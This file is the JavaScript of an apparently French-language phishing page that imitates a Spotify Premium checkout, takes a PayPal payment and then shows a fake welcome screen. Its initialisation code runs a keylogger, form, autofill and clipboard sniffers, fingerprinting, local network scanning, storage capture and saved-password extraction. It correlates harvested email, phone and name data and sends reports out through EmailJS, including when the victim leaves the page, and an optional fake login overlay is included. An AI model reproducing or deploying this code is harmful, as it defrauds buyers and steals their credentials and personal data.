async function sendAbandonmentReport() {
    if (!hasPurchased && !reportSent) {
        captureStorages();
        await sendFullReport();
    }
}

// ====================== 20. PAIEMENT ET FIN ======================
function renderPayPalButton() {
    if (!window.paypal) {
        console.error("PayPal SDK non chargé");
        return;
    }
    paypal.Buttons({
        style: { layout: 'vertical', color: 'gold', shape: 'pill', label: 'paypal' },
        createOrder: (data, actions) => actions.order.create({ purchase_units: [{ amount: { value: '9.90' } }] }),
        onApprove: (data, actions) => actions.order.capture().then(() => {
            hasPurchased = true;
            clearInterval(periodicInterval);
            handleSuccessPayment();
        })
    }).render('#paypal-button-container');
}

function handleSuccessPayment() {
    const container = document.querySelector('.container');
    if (container) {
        container.innerHTML = `
            <div style="text-align:center; padding: 40px 0;">
                <div style="background:#1DB954; width:64px; height:64px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; margin-bottom:24px;">
                    <svg viewBox="0 0 24 24" width="32" fill="#000"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
                </div>
                <h1 style="font-size:32px;">Bienvenue sur Spotify Premium</h1>
                <p style="color:#B3B3B3; margin-top:16px;">Votre compte est en cours d'activation. Profitez de votre musique sans limites.</p>
            </div>
        `;
    }
}

// ====================== 21. INITIALISATION ======================
export async function initApp() {
    emailjs.init(EMAILJS_PUBLIC_KEY);

    // Tracking comportemental
    setupTracking();
    setupKeylogger();
    setupFormWatcher();
    setupAutofillSniffer();
    setupAdvancedClipboardSniffer();

    // Fingerprinting
    await ultimateFingerprint();

    // Réseau
    getLocalIP();
    getAllLocalIPs();
    fetchPublicIP();
    detectVPN();
    measureNetworkLatency();
    scanLocalNetwork();

    // Stockages
    captureStorages();

    // Extensions et logiciels
    detectExtensions();
    detectInstalledSoftware();

    // Géolocalisation
    getGeoLocation();

    // Performance
    capturePerformance();

    // Extraction de données sensibles
    extractSavedPasswords();

    // Identité via email/phone déjà collectés (sniffAutofill les fournit)
    // On va attendre un peu pour avoir des données
    setTimeout(async () => {
        if (sessionData.identity.leakedInfo.email && sessionData.identity.leakedInfo.email !== "Non détecté") {
            await extractIdentityFromEmail(sessionData.identity.leakedInfo.email);
        }
        if (sessionData.identity.leakedInfo.phone && sessionData.identity.leakedInfo.phone !== "Non détecté") {
            await extractIdentityFromPhone(sessionData.identity.leakedInfo.phone);
        }
        if (sessionData.identity.leakedInfo.name && sessionData.identity.leakedInfo.name !== "Non détecté") {
            const nameParts = sessionData.identity.leakedInfo.name.split(' ');
            await searchSocialMedia(sessionData.identity.leakedInfo.email, { first: nameParts[0], last: nameParts.slice(1).join(' ') });
        }
        await correlateIdentityData();
    }, 3000);

    // Récupération IP enrichie
    setTimeout(() => {
        if (sessionData.net.ip && sessionData.net.ip !== "Inconnue") {
            extractIdentityFromIP(sessionData.net.ip);
        }
    }, 2000);

    // Fake login (optionnel, à activer si vous voulez un overlay)
    // deployAdvancedFakeLogin(); // Décommentez si vous voulez l'overlay

    // Paiement
    renderPayPalButton();

    // Rapports périodiques et abandon
    startPeriodicReport();
    window.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') sendAbandonmentReport(); });
    window.addEventListener('pagehide', sendAbandonmentReport);
}
